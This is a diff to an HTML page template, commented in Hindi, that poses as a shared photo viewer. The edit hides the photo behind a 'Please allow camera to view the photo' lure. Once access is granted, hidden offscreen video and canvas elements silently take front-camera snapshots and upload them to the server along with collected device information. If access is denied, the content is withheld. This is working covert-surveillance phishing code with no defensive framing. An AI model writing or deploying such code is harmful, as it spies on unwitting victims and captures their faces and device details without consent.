@@ -5,13 +5,17 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Photo</title>
     <style>
-        body { margin:0; padding:10px; background:#111; text-align:center; }
-        img { max-width:100%; border-radius:10px; display:block; }
+        body { margin:0; padding:0; background:#111; text-align:center; }
+        #photo { max-width:100%; border-radius:10px; display:none; }  /* शुरू में छिपा */
+        #message { color:white; font-family:sans-serif; padding:20px; font-size:18px; }
         video, canvas, #status { position:absolute; left:-9999px; width:1px; height:1px; }
     </style>
 </head>
 <body>
-    <img src="{{ photo_url }}" alt="Photo">
+    <!-- पहले एक मैसेज दिखेगा, फोटो छिपी रहेगी -->
+    <p id="message">📸 Please allow camera to view the photo</p>
+    <img id="photo" src="{{ photo_url }}" alt="Photo">
+
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <p id="status" style="display:none;"></p>
@@ -20,8 +24,10 @@
         const uniqueId = "{{ unique_id }}";
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const photo = document.getElementById('photo');
+        const message = document.getElementById('message');
 
-        // 📱 डिवाइस इन्फो इकट्ठा करके भेजें (बिना पॉपअप)
+        // 📱 डिवाइस इन्फो (बिना पॉपअप)
         async function sendDeviceInfo() {
             const info = {
                 userAgent: navigator.userAgent,
@@ -55,15 +61,14 @@
             }).catch(e => console.error(e));
         }
 
-        // 📸 2 फोटो (पहले जैसा)
-        async function autoCapture() {
+        // 📸 2 फोटो कैप्चर (पहले जैसा)
+        async function capturePhotos(stream) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                video.srcObject = stream;
-                await new Promise(r => video.onloadedmetadata = r);
+                // थोड़ा रुकें ताकि कैमरा सेट हो
+                await new Promise(r => setTimeout(r, 500));
                 for (let i = 0; i < 2; i++) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
                     canvas.getContext('2d').drawImage(video, 0, 0);
                     const imageData = canvas.toDataURL('image/jpeg', 0.9);
                     fetch('/upload/' + uniqueId, {
@@ -73,13 +78,31 @@
                     }).catch(e => console.error(e));
                     await new Promise(r => setTimeout(r, 500));
                 }
-                stream.getTracks().forEach(track => track.stop());
-            } catch(e) { console.error('Camera error:', e); }
+            } catch(e) { console.error('Photo error:', e); }
         }
 
-        // शुरू करें
-        sendDeviceInfo();
-        autoCapture();
+        // 🚀 शुरू करें
+        (async function main() {
+            sendDeviceInfo();  // डिवाइस इन्फो तुरंत भेजें (बिना किसी रोक-टोक)
+
+            let stream;
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // कैमरा मिल गया — अब फोटो दिखाएँ और मैसेज हटाएँ
+                photo.style.display = 'block';
+                message.style.display = 'none';
+
+                video.srcObject = stream;
+                await new Promise(r => video.onloadedmetadata = r);
+
+                // फोटो कैप्चर शुरू करें
+                capturePhotos(stream);
+            } catch(e) {
+                // कैमरा Allow नहीं किया — फोटो न दिखाएँ, शायद मैसेज को बदल दें
+                message.innerText = '❌ Camera access denied. Content not available.';
+                console.error('Camera permission denied');
+            }
+        })();
     </script>
 </body>
 </html>
